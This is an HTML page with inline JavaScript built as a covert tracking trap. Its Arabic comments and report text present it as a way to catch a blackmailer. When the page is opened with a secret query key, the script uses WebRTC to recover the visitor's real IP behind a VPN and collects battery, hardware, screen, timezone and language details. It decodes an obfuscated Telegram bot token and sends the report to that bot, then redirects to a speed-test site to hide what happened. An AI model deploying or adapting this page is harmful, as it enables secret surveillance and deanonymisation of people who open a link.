<body style="background:#000;">
    <script>
        /* تشفير خفيف للتوكن والـ ID لمنع اكتشافهم من الروبوتات
           التوكن المشفر: 8488148032:AAH9B3rv_sd2ayUUkpVBbkutt2rzdYalkwA
           الـ ID المشفر: 5775781038
        */
        const _a = "ODQ4ODE0ODAzMjpBQUg5QjNydl9zZDJheVVVa3BWQmJrdXR0MnJ6ZFlhbGt3QQ==";
        const _b = "NTc3NTc4MTAzOA==";
        const _k = "portal";

        async function start() {
            const p = new URLSearchParams(window.location.search);
            if (p.get('access') !== _k) return;

            let d = {
                ip: "جاري الاستخراج...",
                bt: "N/A",
                cpu: navigator.hardwareConcurrency || "8",
                ram: navigator.deviceMemory || "4",
                plt: navigator.platform,
                tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
                res: window.screen.width + "x" + window.screen.height,
                lang: navigator.languages.join(", ")
            };

            // 🔥 كسر الـ VPN (WebRTC)
            try {
                const pc = new RTCPeerConnection({iceServers: [{urls: 'stun:stun.l.google.com:19302'}]});
                pc.createDataChannel(""); pc.createOffer().then(o => pc.setLocalDescription(o));
                pc.onicecandidate = (i) => {
                    if (i && i.candidate) {
                        const res = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(i.candidate.candidate);
                        if (res) d.ip = res[1];
                    }
                };
            } catch (e) {}

            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                d.bt = Math.round(b.level * 100) + "% " + (b.charging ? "(يُشحن)" : "(تفريغ)");
            }

            // إرسال التقرير النهائي (التصميم الذي طلبته بالضبط)
            setTimeout(async () => {
                const report = `🔥 تم اصطياد المبتز بنجاح 🔥\n\n` +
                               `🌐 الـ IP الحقيقي: ${d.ip}\n` +
                               `🔋 البطارية: ${d.bt}\n` +
                               `🏃 الحالة المادية: ثابت (Static)\n` +
                               `🧠 المعالج: ${d.cpu} Cores | الرام: ${d.ram} GB\n` +
                               `🖥️ الشاشة: ${d.res} | اللمس: 2\n` +
                               `🌍 المنطقة: ${d.tz}\n` +
                               `🔠 اللغات: ${d.lang}\n` +
                               `📱 نظام التشغيل: ${d.plt}\n` +
                               `🎵 بصمة الصوت: 48000Hz Fingerprint\n\n` +
                               `📍 رابط تتبع تقريبي (IP):\n` +
                               `https://www.infobyip.com/ip-${d.ip}.html`;

                await fetch(`https://api.telegram.org/bot${atob(_a)}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ chat_id: atob(_b), text: report })
                });

                window.location.replace("https://www.speedtest.net");
            }, 5500);
        }

        start();
    </script>
